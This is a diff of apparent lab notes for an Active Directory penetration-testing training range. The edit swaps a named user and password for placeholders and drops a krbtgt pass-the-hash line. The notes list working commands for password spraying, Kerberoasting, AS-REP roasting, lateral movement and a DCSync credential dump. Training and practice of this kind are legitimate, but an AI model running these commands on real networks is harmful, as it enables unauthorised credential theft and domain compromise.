@@ -2,25 +2,25 @@
 
 ## Targets
 
-- **dc01 + dc02** (corps DCs), **ws01 + ws02** (workstations)
-- entry: helpdesk user jholt — seasonal password
+- **dc01 + dc02** (corp DCs), **ws01 + ws02** (workstations)
+- entry: a helpdesk user with a seasonal password — SYSVOL names them
 
 ## Useful commands
 
 ```bash
 # user enum + spray (slow — one password per window)
-kerbrute userenum --dc <dc01> -d corp.pentrain.local users.txt
-netexec smb <dc01> -u users.txt -p 'Summer2024!' --continue-on-success
+kerbrute userenum --dc <dc01> -d corp.pentrain.local <users.txt>
+netexec smb <dc01> -u <users.txt> -p '<seasonal>' --continue-on-success
+smbclient -N //<ws01>/ops -c 'recurse;ls'            # anonymous shares too
 
 # with any domain user:
-bloodhound-python -u jholt -p 'Summer2024!' -d corp.pentrain.local -dc <dc01> -c all
-impacket-GetUserSPNs 'corp.pentrain.local/jholt:Summer2024!' -request
-impacket-GetNPUsers -no-pass -usersfile users.txt corp.pentrain.local/
+bloodhound-python -u <user> -p '<pw>' -d corp.pentrain.local -dc <dc01> -c all
+impacket-GetUserSPNs 'corp.pentrain.local/<user>:<pw>' -request
+impacket-GetNPUsers -no-pass -usersfile <users.txt> corp.pentrain.local/
 
 # lateral + sync
 evil-winrm -i <ws01> -u <user> -p '<pass>'
-impacket-secretsdump 'corp.pentrain.local/admin:pass@<dc01>' -just-dc
-impacket-psexec -hashes :<krbtgt-ntlm> corp.pentrain.local/krbtgt@<dc02>
+impacket-secretsdump 'corp.pentrain.local/<user>:<pass>@<dc01>' -just-dc
 ```
 
 ## Concepts
